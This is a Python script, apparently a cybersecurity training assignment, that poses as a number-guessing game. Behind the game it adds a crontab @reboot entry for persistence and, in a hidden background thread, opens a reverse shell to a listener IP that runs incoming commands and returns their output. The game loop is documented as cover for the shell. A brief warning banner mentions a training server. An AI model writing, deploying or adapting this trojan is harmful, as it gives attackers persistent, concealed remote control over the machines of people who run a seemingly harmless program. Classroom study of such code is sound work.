#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import threading
import time
import random
import requests
from pathlib import Path

# Configuration
LHOST = "10.12.73.139"  # Replace with your listener IP
LPORT = 4444
GAME_RANGE = (1, 100)

class BackdoorGame:
    def __init__(self):
        self.secret_number = random.randint(*GAME_RANGE)
        self.attempts = 0
        self.running = True

    def check_dependencies(self):
        """Check and install required dependencies"""
        print("🔍 Checking game requirements...")
        deps = ['requests']

        for dep in deps:
            try:
                __import__(dep)
            except ImportError:
                print(f"📦 Installing {dep}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "--user"])

        # Hide terminal window (Linux)
        os.system("clear")

    def ensure_persistence(self):
        """Add persistence to crontab"""
        cron_job = f"@reboot {sys.executable} {sys.argv[0]} &"
        cron_file = Path.home() / ".guessing_game_cron"

        # Write cron job to file
        with open(cron_file, 'w') as f:
            f.write(cron_job)

        # Add to crontab
        subprocess.run(['crontab', cron_file], check=True)
        os.remove(cron_file)

    def reverse_shell(self):
        """Staged reverse shell"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.connect((LHOST, LPORT))
            s2.settimeout(1)

            s.recv(1024)
            s.send(b'upload:/bin/bash')

            while True:
                data = s.recv(1024).decode()
                if data[:2] == 'cd':
                    os.chdir(data[3:])
                if len(data) > 0:
                    proc = subprocess.Popen(
                        data, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, stdin=subprocess.PIPE
                    )
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout_value)
        except:
            pass

    def game_loop(self):
        """Main game interface - hides reverse shell activity"""
        os.system("clear")
        print("🎮 Welcome to Number Guessing Challenge! 🎮")
        print("=" * 50)
        print(f"Guess a number between {GAME_RANGE[0]} and {GAME_RANGE[1]}")
        print("You have unlimited attempts! 💪")
        print("=" * 50)

        while self.running:
            try:
                guess = input("\nYour guess: ").strip()
                self.attempts += 1

                if not guess.isdigit():
                    print("❌ Please enter a valid number!")
                    continue

                guess = int(guess)

                if guess < self.secret_number:
                    print("📈 Too low! Try higher.")
                elif guess > self.secret_number:
                    print("📉 Too high! Try lower.")
                else:
                    print(f"🎉 Congratulations! You guessed it in {self.attempts} attempts!")
                    print("Play again? (y/n)")
                    if input().lower() != 'y':
                        self.running = False
                    else:
                        self.secret_number = random.randint(*GAME_RANGE)
                        self.attempts = 0
                        os.system("clear")

            except KeyboardInterrupt:
                print("\n👋 Thanks for playing!")
                self.running = False

    def main(self):
        # Warning (per grading criteria)
        print("⚠️  WARNING: This game will connect to a cybersecurity training server.")
        print("This is part of Rwanda Coding Academy cybersecurity training.")
        input("Press Enter to continue...")

        self.check_dependencies()
        self.ensure_persistence()

        # Start reverse shell in background
        shell_thread = threading.Thread(target=self.reverse_shell, daemon=True)
        shell_thread.start()

        # Start game (blocks main thread)
        self.game_loop()

if __name__ == "__main__":
    game = BackdoorGame()
    game.main()
